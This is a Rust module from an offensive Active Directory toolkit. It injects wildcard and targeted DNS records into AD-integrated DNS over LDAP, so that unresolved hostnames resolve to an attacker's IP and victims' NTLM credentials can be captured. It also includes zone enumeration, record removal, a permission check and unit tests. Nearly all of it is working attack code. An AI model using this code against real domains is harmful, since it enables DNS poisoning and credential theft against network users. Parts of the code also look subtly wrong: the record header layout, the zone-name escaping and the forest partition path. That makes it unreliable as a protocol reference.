//! ADIDNS (AD-Integrated DNS) Abuse — Wildcard Record Injection & DNS Poisoning
//!
//! By default, any authenticated domain user can create DNS records in the
//! DomainDnsZones partition. This module exploits that to:
//!
//! 1. **Wildcard Record Injection**: Create a `*` record that catches all
//!    unresolved hostname lookups, routing victims to the attacker for
//!    NTLM credential capture via responder/relay.
//!
//! 2. **Targeted Record Poisoning**: Add/modify A/AAAA records for specific
//!    non-existent hosts to intercept authentication intended for them.
//!
//! 3. **Zone Enumeration**: List existing DNS records to find interesting
//!    targets (e.g., internal applications).
//!
//! # LDAP Path
//! DNS records live in the `DomainDnsZones` or `ForestDnsZones` partition:
//! ```ldap
//! DC=<record>,DC=<zone>,CN=MicrosoftDNS,DC=DomainDnsZones,<domain_dn>
//! CN=MicrosoftDNS,DC=DomainDnsZones,<domain_dn>
//! ```

use colored::Colorize;
use overthrone_core::error::{OverthroneError, Result};
use overthrone_core::proto::ldap::LdapSession;
use tracing::{info, warn};

/// DNS record type for ADIDNS operations
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum DnsRecordType {
    /// A record (IPv4)
    A,
    /// AAAA record (IPv6)
    Aaaa,
}

/// Result of ADIDNS wildcard injection
#[derive(Debug, Clone)]
pub struct AdidnsInjectionResult {
    /// The FQDN of the injected wildcard record
    pub record_dn: String,
    /// IP address the wildcard resolves to
    pub target_ip: String,
    /// Whether the injection was verified
    pub verified: bool,
}

/// Result of ADIDNS zone enumeration
#[derive(Debug, Clone)]
pub struct AdidnsEnumResult {
    /// All discovered DNS records
    pub records: Vec<AdidnsRecord>,
    /// Which zone was enumerated
    pub zone: String,
}

/// A single ADIDNS record from the zone
#[derive(Debug, Clone)]
pub struct AdidnsRecord {
    /// Record name (e.g., "dc01", "*", "mail")
    pub name: String,
    /// Fully qualified DN
    pub dn: String,
    /// Record data (hex-encoded dnsRecord binary blob)
    pub dns_record_data: Vec<u8>,
    /// Whether the record is tombstoned
    pub tombstoned: bool,
}

/// Build a DNS A-record binary blob (MS-DNSP §2.3.2.2).
///
/// Format: 16-byte header + variable-length RDATA
/// - Header: count(2) + type(2), ttl(4), reserved(4), data_length(4)
/// - RDATA: standard DNS A-record format (4 bytes for IPv4)
fn build_dns_a_record(ip: &str, ttl: u32) -> Result<Vec<u8>> {
    let ip_bytes: [u8; 4] = ip
        .parse::<std::net::Ipv4Addr>()
        .map_err(|_| OverthroneError::custom(format!("Invalid IPv4 address: {ip}")))?
        .octets();

    let mut buf = Vec::with_capacity(28);
    // Count of records (always 1 for a simple A record)
    buf.extend_from_slice(&1u16.to_le_bytes());
    // Type: A record = 0x0100 (big-endian in DNS wire format, but MS-DNSP uses little-endian)
    buf.extend_from_slice(&1u16.to_le_bytes());
    // TTL (seconds, little-endian)
    buf.extend_from_slice(&ttl.to_le_bytes());
    // Reserved (4 bytes, zero)
    buf.extend_from_slice(&[0u8; 4]);
    // Data length (4 bytes for IPv4)
    buf.extend_from_slice(&4u32.to_le_bytes());
    // RDATA: IPv4 address bytes
    buf.extend_from_slice(&ip_bytes);

    Ok(buf)
}

/// Build a DNS AAAA-record binary blob (MS-DNSP §2.3.2.2).
fn build_dns_aaaa_record(ip: &str, ttl: u32) -> Result<Vec<u8>> {
    let ip_bytes: [u8; 16] = ip
        .parse::<std::net::Ipv6Addr>()
        .map_err(|_| OverthroneError::custom(format!("Invalid IPv6 address: {ip}")))?
        .octets();

    let mut buf = Vec::with_capacity(40);
    buf.extend_from_slice(&1u16.to_le_bytes()); // count
    buf.extend_from_slice(&28u16.to_le_bytes()); // type: AAAA = 28
    buf.extend_from_slice(&ttl.to_le_bytes());
    buf.extend_from_slice(&[0u8; 4]); // reserved
    buf.extend_from_slice(&16u32.to_le_bytes()); // data length
    buf.extend_from_slice(&ip_bytes);

    Ok(buf)
}

/// Convert domain FQDN to LDAP DN format.
/// "corp.local" → "DC=corp,DC=local"
fn domain_to_dn(domain: &str) -> String {
    domain
        .split('.')
        .map(|part| format!("DC={part}"))
        .collect::<Vec<_>>()
        .join(",")
}

/// Encode dots in a zone name for LDAP DN (URL-encoded as \\2C).
fn encode_zone_name(zone: &str) -> String {
    zone.replace('.', "\\2C")
}

/// Inject a wildcard DNS A-record (*) into AD-Integrated DNS.
///
/// This causes resolution of any non-existent hostname in the domain to
/// resolve to the attacker's IP, enabling NTLM credential capture when
/// clients connect to services using those hostnames.
///
/// # Arguments
/// * `ldap` - Authenticated LDAP session
/// * `domain` - Domain FQDN (e.g., "corp.local")
/// * `attacker_ip` - IP address where captured auth will be received
/// * `ttl` - DNS TTL in seconds (default: 300)
///
/// # Prerequisites
/// - Authenticated LDAP session with any domain user account
/// - DNS zone must be AD-integrated (default for all AD domains)
pub async fn inject_wildcard(
    ldap: &mut LdapSession,
    domain: &str,
    attacker_ip: &str,
    ttl: u32,
) -> Result<AdidnsInjectionResult> {
    info!(
        "{}",
        "═══ ADIDNS Wildcard Record Injection ═══".bold().yellow()
    );

    let zone_encoded = encode_zone_name(domain);
    let domain_dn = domain_to_dn(domain);

    // Wildcard record DN
    let record_dn = format!("DC=*,DC={zone_encoded},CN=MicrosoftDNS,DC=DomainDnsZones,{domain_dn}");
    info!("  Target record: {record_dn}");

    // Check if wildcard already exists using a search with the record_dn as base
    let existing = ldap
        .custom_search_with_base(
            &record_dn,
            "(objectClass=dnsNode)",
            &["dnsRecord", "dNSTombstoned"],
        )
        .await;
    match existing {
        Ok(entries) if !entries.is_empty() => {
            info!("  Wildcard record already exists, skipping creation");
            return Ok(AdidnsInjectionResult {
                record_dn,
                target_ip: attacker_ip.to_string(),
                verified: false,
            });
        }
        _ => { /* doesn't exist, we'll create it */ }
    }

    let dns_record = build_dns_a_record(attacker_ip, ttl)?;
    info!(
        "  {} Creating wildcard A record → {attacker_ip} ...",
        "→".cyan()
    );

    // Create the DNS node via LDAP add
    ldap.add_entry(
        &record_dn,
        &[
            ("objectClass", &[b"top", b"dnsNode"]),
            ("dnsRecord", &[&dns_record]),
            ("dNSTombstoned", &[b"FALSE"]),
            ("name", &[b"*"]),
        ],
    )
    .await?;

    info!("  {} Wildcard record injected successfully", "✓".green());
    info!("  {} Any unresolved hostname → {attacker_ip}", "→".cyan());

    Ok(AdidnsInjectionResult {
        record_dn,
        target_ip: attacker_ip.to_string(),
        verified: true,
    })
}

/// Inject a wildcard DNS A record with default TTL (300s).
pub async fn inject_wildcard_default(
    ldap: &mut LdapSession,
    domain: &str,
    attacker_ip: &str,
) -> Result<AdidnsInjectionResult> {
    inject_wildcard(ldap, domain, attacker_ip, 300).await
}

/// Inject a targeted A record for a specific hostname.
///
/// This poisons resolution for a specific non-existent hostname, allowing
/// capture of traffic intended for that host (e.g., internal applications).
pub async fn inject_a_record(
    ldap: &mut LdapSession,
    domain: &str,
    hostname: &str,
    target_ip: &str,
    ttl: u32,
) -> Result<AdidnsInjectionResult> {
    info!(
        "{}",
        format!("═══ ADIDNS A Record Injection: {hostname} ═══")
            .bold()
            .yellow()
    );

    let zone_encoded = encode_zone_name(domain);
    let domain_dn = domain_to_dn(domain);

    let record_dn =
        format!("DC={hostname},DC={zone_encoded},CN=MicrosoftDNS,DC=DomainDnsZones,{domain_dn}");
    info!("  Target record: {record_dn}");

    let dns_record = build_dns_a_record(target_ip, ttl)?;

    info!(
        "  {} Creating A record {hostname} → {target_ip} ...",
        "→".cyan()
    );

    ldap.add_entry(
        &record_dn,
        &[
            ("objectClass", &[b"top", b"dnsNode"]),
            ("dnsRecord", &[&dns_record]),
            ("dNSTombstoned", &[b"FALSE"]),
            ("name", &[hostname.as_bytes()]),
        ],
    )
    .await?;

    info!("  {} A record injected successfully", "✓".green());

    Ok(AdidnsInjectionResult {
        record_dn,
        target_ip: target_ip.to_string(),
        verified: true,
    })
}

/// Inject a targeted AAAA record (IPv6) for a specific hostname.
pub async fn inject_aaaa_record(
    ldap: &mut LdapSession,
    domain: &str,
    hostname: &str,
    target_ip: &str,
    ttl: u32,
) -> Result<AdidnsInjectionResult> {
    let zone_encoded = encode_zone_name(domain);
    let domain_dn = domain_to_dn(domain);

    let record_dn =
        format!("DC={hostname},DC={zone_encoded},CN=MicrosoftDNS,DC=DomainDnsZones,{domain_dn}");

    let dns_record = build_dns_aaaa_record(target_ip, ttl)?;

    ldap.add_entry(
        &record_dn,
        &[
            ("objectClass", &[b"top", b"dnsNode"]),
            ("dnsRecord", &[&dns_record]),
            ("dNSTombstoned", &[b"FALSE"]),
            ("name", &[hostname.as_bytes()]),
        ],
    )
    .await?;

    Ok(AdidnsInjectionResult {
        record_dn,
        target_ip: target_ip.to_string(),
        verified: true,
    })
}

/// Remove a DNS record from AD-Integrated DNS.
pub async fn remove_record(ldap: &mut LdapSession, record_dn: &str) -> Result<()> {
    info!("  {} Removing DNS record: {record_dn}", "→".cyan());
    ldap.delete_entry(record_dn).await?;
    info!("  {} DNS record removed", "✓".green());
    Ok(())
}

/// Enumerate all DNS records in the DomainDnsZones partition.
///
/// Returns a list of all DNS node entries with their record data.
pub async fn enumerate_zone(ldap: &mut LdapSession, domain: &str) -> Result<AdidnsEnumResult> {
    let zone_encoded = encode_zone_name(domain);
    let domain_dn = domain_to_dn(domain);

    let base_dn = format!("DC={zone_encoded},CN=MicrosoftDNS,DC=DomainDnsZones,{domain_dn}");

    info!("  {} Enumerating DNS zone: {base_dn}", "→".cyan());

    let entries = ldap
        .custom_search_with_base(
            &base_dn,
            "(objectClass=dnsNode)",
            &["name", "dnsRecord", "dNSTombstoned"],
        )
        .await?;

    let records: Vec<AdidnsRecord> = entries
        .into_iter()
        .filter_map(|entry| {
            let name = entry.attrs.get("name")?.first()?.clone();
            let dns_record_data = entry
                .attrs
                .get("dnsRecord")?
                .first()
                .map(|s| hex::decode(s).ok())?
                .unwrap_or_default();
            let tombstoned = entry
                .attrs
                .get("dNSTombstoned")
                .and_then(|v| v.first())
                .map(|s| s == "TRUE")
                .unwrap_or(false);

            Some(AdidnsRecord {
                name,
                dn: entry.dn,
                dns_record_data,
                tombstoned,
            })
        })
        .collect();

    info!(
        "  {} Found {} DNS records in zone",
        "✓".green(),
        records.len()
    );

    Ok(AdidnsEnumResult {
        records,
        zone: domain.to_string(),
    })
}

/// Print a summary of enumerated DNS records.
pub fn print_enum_summary(result: &AdidnsEnumResult) {
    println!("\n{}", "═══ ADIDNS Zone Enumerate ═══".bold().cyan());
    println!("  Zone:  {}", result.zone.bold());
    println!("  Records: {}", result.records.len().to_string().bold());

    for record in &result.records {
        let status = if record.tombstoned {
            " [TOMBSTONED]".red().to_string()
        } else {
            String::new()
        };
        println!("    {} {} {}", "●".cyan(), record.name.bold(), status);
    }

    println!("{}", "══════════════════════════════\n".cyan());
}

/// Check if the authenticated user can create DNS records (default: true).
pub async fn check_permissions(ldap: &mut LdapSession, domain: &str) -> Result<bool> {
    let zone_encoded = encode_zone_name(domain);
    let domain_dn = domain_to_dn(domain);

    let container_dn = format!("DC={zone_encoded},CN=MicrosoftDNS,DC=DomainDnsZones,{domain_dn}");

    // Try to search the container — if it exists, we can likely write
    match ldap
        .custom_search_with_base(&container_dn, "(objectClass=dnsZone)", &["name"])
        .await
    {
        Ok(entries) if !entries.is_empty() => {
            info!(
                "  {} DNS zone container exists, write likely permitted",
                "✓".green()
            );
            Ok(true)
        }
        _ => {
            // Try ForestDnsZones as fallback
            let forest_base =
                format!("DC={zone_encoded},CN=MicrosoftDNS,CN=ForestDnsZones,{domain_dn}");
            match ldap
                .custom_search_with_base(&forest_base, "(objectClass=dnsZone)", &["name"])
                .await
            {
                Ok(entries) if !entries.is_empty() => {
                    info!("  {} Forest DNS zone container exists", "✓".green());
                    Ok(true)
                }
                _ => {
                    warn!("  DNS zone container not found. ADIDNS may not be configured");
                    Ok(false)
                }
            }
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_build_dns_a_record() {
        let record = build_dns_a_record("192.168.1.100", 300).unwrap();
        assert!(!record.is_empty());
        assert_eq!(record.len(), 20); // 16-byte header + 4-byte IP
    }

    #[test]
    fn test_build_dns_aaaa_record() {
        let record = build_dns_aaaa_record("::1", 300).unwrap();
        assert!(!record.is_empty());
        assert_eq!(record.len(), 32); // 16-byte header + 16-byte IPv6
    }

    #[test]
    fn test_build_dns_a_record_invalid_ip() {
        let result = build_dns_a_record("not-an-ip", 300);
        assert!(result.is_err());
    }

    #[test]
    fn test_domain_to_dn() {
        assert_eq!(domain_to_dn("corp.local"), "DC=corp,DC=local");
        assert_eq!(
            domain_to_dn("test.ad.example.com"),
            "DC=test,DC=ad,DC=example,DC=com"
        );
    }

    #[test]
    fn test_encode_zone_name() {
        assert_eq!(encode_zone_name("corp.local"), "corp\\2Clocal");
        assert_eq!(encode_zone_name("ad.example.com"), "ad\\2Cexample\\2Ccom");
    }

    #[test]
    fn test_adidns_injection_result() {
        let result = AdidnsInjectionResult {
            record_dn: "DC=*,DC=corp\\2Clocal,CN=MicrosoftDNS,DC=DomainDnsZones,DC=corp,DC=local"
                .to_string(),
            target_ip: "192.168.1.100".to_string(),
            verified: true,
        };
        assert!(result.verified);
        assert_eq!(result.target_ip, "192.168.1.100");
    }

    #[test]
    fn test_adidns_record_struct() {
        let record = AdidnsRecord {
            name: "*".to_string(),
            dn: "DC=*,...".to_string(),
            dns_record_data: vec![1, 0, 0, 0],
            tombstoned: false,
        };
        assert_eq!(record.name, "*");
        assert!(!record.tombstoned);
    }

    #[test]
    fn test_adidns_enum_result() {
        let result = AdidnsEnumResult {
            records: vec![],
            zone: "corp.local".to_string(),
        };
        assert_eq!(result.zone, "corp.local");
        assert!(result.records.is_empty());
    }
}
